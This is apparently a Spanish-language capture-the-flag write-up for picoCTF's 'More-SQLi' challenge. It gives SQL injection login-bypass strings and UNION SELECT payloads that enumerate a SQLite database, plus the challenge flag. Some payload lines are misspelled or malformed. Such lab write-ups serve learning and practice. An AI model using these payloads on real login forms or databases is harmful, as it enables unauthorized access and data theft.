

## More-SQLi
¿Puedes encontrar la bandera en este sitio web?

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.



Hints:
1. SQLiLite
2. 




## Solución
```
nombre de usuario: juan' o 1=1;
contraseña: juan
Consulta SQL: SELECT id FROM users WHERE password = 'juan' AND username = 'juan' or 1=1;'
Aquí es al reves debemos ingorar de and para delante


Primer inyección

Buscar un nombre 
' union select 1,2;3;  -Para ver que tiene la base de datos
' union select sqlite_versiones,2;3;
' union sql,2,3 from sqlite_master;

' union select id,flag,3 from more_table'

;Nombre de la tabla





Primera parte:
Con esta solución
'or 1=1;--
'123'

Y luego al revez
'123'
'or 1=1;--


Parte 2:
123' UNION SELECT 1, sqlite_version(), 3;--

Parte 3:
123' UNION SELECT name, sql, null from sqlite_master;--


Bandera:
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}



Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}



```
